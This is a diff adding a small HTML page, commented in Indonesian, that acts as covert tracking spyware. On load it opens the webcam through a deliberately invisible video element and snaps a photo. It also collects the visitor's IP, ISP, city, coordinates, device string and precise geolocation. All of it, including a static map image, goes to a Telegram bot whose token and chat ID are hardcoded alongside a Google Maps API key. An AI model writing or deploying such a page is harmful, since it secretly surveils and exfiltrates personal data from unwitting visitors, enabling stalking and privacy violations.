@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Capture & Info</title>
+    <style>
+        video {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0; /* Buat kamera tidak terlihat */
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body onload="startCapture(); getUserInfo(); getUserLocation();">
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = "7783606251:AAHfso5w1XcaUwJYE_VnHSd2hl8x8S4AqAU"; // Ganti dengan token bot
+        const TELEGRAM_CHAT_ID = "7711427708"; // Ganti dengan ID chat
+        const GOOGLE_MAPS_API_KEY = "AIzaSyAAfWxFyUDn7wYXZNsWygF_qAnru6QUD9Y"; // Ganti dengan API Key Google Maps
+
+        // Fungsi untuk mulai mengambil gambar secara otomatis
+        function startCapture() {
+            navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } })
+                .then(stream => {
+                    let video = document.getElementById("video");
+                    video.srcObject = stream;
+
+                    setTimeout(() => {
+                        let canvas = document.getElementById("canvas");
+                        let context = canvas.getContext("2d");
+
+                        canvas.width = 640;
+                        canvas.height = 480;
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        video.srcObject.getTracks().forEach(track => track.stop());
+
+                        // Kirim gambar ke Telegram
+                        canvas.toBlob(blob => {
+                            let formData = new FormData();
+                            formData.append("chat_id", TELEGRAM_CHAT_ID);
+                            formData.append("photo", blob);
+
+                            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                                method: "POST",
+                                body: formData
+                            })
+                            .then(response => response.json())
+                            .then(data => console.log("Gambar dikirim:", data))
+                            .catch(error => console.error("Gagal mengirim gambar:", error));
+                        }, "image/jpeg");
+                    }, 2000);
+                })
+                .catch(error => console.error("Akses kamera ditolak:", error));
+        }
+
+        // Fungsi untuk mendapatkan data pengguna
+        function getUserInfo() {
+            fetch("https://ipapi.co/json/")
+                .then(response => response.json())
+                .then(data => {
+                    let userInfo = `
+📌 **DATA PENGGUNA** 📌
+🖥 IP Address: ${data.ip}
+🏢 ISP: ${data.org}
+🌆 Kota: ${data.city}
+🇮🇩 Negara: ${data.country_name}
+📍 Koordinat: ${data.latitude}, ${data.longitude}
+📱 Perangkat: ${navigator.userAgent}
+                    `;
+
+                    console.log(userInfo);
+
+                    // Kirim data ke Telegram
+                    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: userInfo, parse_mode: "Markdown" })
+                    })
+                    .then(response => response.json())
+                    .then(data => console.log("Data dikirim:", data))
+                    .catch(error => console.error("Gagal mengirim data:", error));
+                })
+                .catch(error => console.error("Gagal mendapatkan data pengguna:", error));
+        }
+
+        // Fungsi untuk mendapatkan lokasi pengguna dan mengirim peta ke Telegram
+        function getUserLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    let latitude = position.coords.latitude;
+                    let longitude = position.coords.longitude;
+
+                    // Kirim lokasi ke bot Telegram
+                    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            latitude: latitude,
+                            longitude: longitude
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => console.log("Lokasi dikirim:", data))
+                    .catch(error => console.error("Gagal mengirim lokasi:", error));
+
+                    // Kirim foto peta dari Google Maps
+                    let mapUrl = `https://maps.googleapis.com/maps/api/staticmap?center=${latitude},${longitude}&zoom=15&size=600x300&markers=color:red%7C${latitude},${longitude}&key=${GOOGLE_MAPS_API_KEY}`;
+
+                    fetch(mapUrl)
+                        .then(res => res.blob())
+                        .then(blob => {
+                            let formData = new FormData();
+                            formData.append("chat_id", TELEGRAM_CHAT_ID);
+                            formData.append("photo", blob);
+
+                            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                                method: "POST",
+                                body: formData
+                            })
+                            .then(response => response.json())
+                            .then(data => console.log("Foto lokasi dikirim:", data))
+                            .catch(error => console.error("Gagal mengirim foto lokasi:", error));
+                        });
+                }, error => {
+                    console.error("Gagal mendapatkan lokasi:", error);
+                });
+            } else {
+                console.error("Geolocation tidak didukung di browser ini.");
+            }
+        }
+    </script>
+
+</body>
+</html>
